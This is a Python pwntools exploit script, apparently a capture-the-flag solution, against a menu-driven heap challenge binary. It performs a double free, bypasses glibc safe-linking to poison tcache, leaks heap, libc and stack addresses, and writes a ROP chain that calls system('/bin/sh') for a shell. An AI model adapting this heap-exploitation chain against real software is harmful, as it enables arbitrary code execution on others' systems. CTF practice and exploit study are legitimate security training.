#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe

gs = """
b main
 b *create_memory+298
 c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gs)
    else:
        r = remote("127.0.0.1", 10001)

    return r

p = conn()
r=p

def create(idx, size, data):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'vivid is this memory?', str(size).encode())
    p.sendafter(b'remember? ', data)

def edit(idx, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'rewrite?', str(idx).encode())
    p.sendafter(b'memory:', data)

def recall(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'recall?', str(idx).encode())
    return p.recvline().strip()

def free(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'erase?', str(idx).encode())

def quit():
    p.sendline(b"5")


def doublefree(idx):
    free(str(idx).encode())
    edit(str(idx).encode(),cyclic(0x10))
    free(str(idx).encode())
    
def safelink(ptr):
    for i in range(8):
        ptr ^= (ptr >> 12) & (0xff00000000000000 >> i*8)

    return ptr
def Link(val, pos):
    return val ^ (pos >> 12)


def main():

    # good luck pwning :)
    create(0,768,b"cats0")
    create(1,768,b"cats1")
    create(2,768,p64(0x0)*(0x190//8 - 2)+p64(0x4a0)+ p64(0x181))


    doublefree(0)

    heap = recall(0)
    heap__base = safelink(unpack(heap.ljust(8,b"\x00"),"all"))
    target = (heap__base >> 12)*0x1000+ 0x5a0 - 0x10
    linked_target = Link(target,heap__base)


    print("[+] Heap base  ",hex(heap__base))
    print("[+] Heap Size target  ",hex(target))
    print("[+] Linked Target ",hex(linked_target))

    edit(0,p64(linked_target))
    create(3,768,b"cats0")
    create(4,768,p64(0x0)*3 + p64(0x4a0+1))


    free(1)
    libcleak = unpack(recall(1),"all") * 0x100
    libc.address = libcleak - 0x203b00
    system = libc.sym['system']
    environ = libc.sym.environ - 0x18
    linked_env = Link(environ,heap__base)
    print("[+]Leaked libc = ", hex(libcleak))
    print("[+]environ libc = ", hex(environ))
    print("[+] Linked env  ",hex(linked_env))



    doublefree(0)
    edit(0,p64(linked_env))
    create(5,768,b"cats5")
    create(6,768,b'\x11'*8*3)


    stackcleak = unpack(recall(6)[24:],"all")
    ret = stackcleak -0x180 - 8 + 0x30


    print("[+] stack  leak",hex(stackcleak))
    print("[+] ret stack  ",hex(ret))

    linked_ret = Link(ret,heap__base)

    doublefree(5)
    edit(5,p64(linked_ret))
    create(7,768,b"cats5")
    #===========rop chain===========
    system_addr = libc.address + 0x58750
    log.info("system addr: " + hex(system_addr))
    binsh = libc.address + 0x1cb42f
    log.info("/bin/sh addr: " + hex(binsh))
    pop_rdi = libc.address + 0x10f78b
    log.info("pop rdi addr: " + hex(pop_rdi))
    ret = libc.address + 0xbbcbe
    log.info("ret addr: " + hex(ret))
    payload = flat(
        pop_rdi,
        binsh,
        ret,
        system_addr
    )

    create(8,768, p64(ret)+ payload)


    p.interactive()  


if __name__ == "__main__":
    main()
